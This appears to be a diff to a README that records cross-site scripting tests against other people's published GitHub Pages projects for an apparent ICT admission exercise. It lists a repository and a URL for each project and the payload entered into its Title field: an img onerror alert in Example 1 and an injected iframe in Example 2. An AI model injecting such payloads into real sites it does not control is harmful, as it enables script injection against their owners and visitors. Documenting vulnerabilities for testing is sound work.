@@ -1,5 +1,36 @@
 # test-ictconscript-admission-xsstesting
 
+## Example 1
+
+
+**GIT Repository:** https://github.com/Rozza049/test-ictadmission
+
+**Published URL:** https://rozza049.github.io/test-ictadmission/
+
+<img width="1225" height="440" alt="kuva" src="https://github.com/user-attachments/assets/7915a53f-9268-4503-abde-0e1f1e77e541" />
+
+### This code was inserted into Title field works also for the body..
+```js
+<img src="__.jpg" onerror="alert('XSS TEST NOT PASSED');">
+```
+
+
+## Example 2
+
+**GIT Repository:** https://github.com/aapeliw/test-ictconscript-admission/
+
+**Published URL:** https://aapeliw.github.io/test-ictconscript-admission/
+
+<img width="1920" height="947" alt="kuva" src="https://github.com/user-attachments/assets/9a65a68d-368b-4caf-b521-31d3f8aa261d" />
+
+
+### This code was inserted into Title field works also for the body..
+```js
+<iframe src="https://blog.nashtechglobal.com/wp-content/uploads/2024/06/cross-site-scripting-xss.jpg" width="30%" height="500"></iframe>
+```
+
+## Example 3
+
 
 **GIT Repository:** https://github.com/RoxareX/test-ictconscript-admission
 
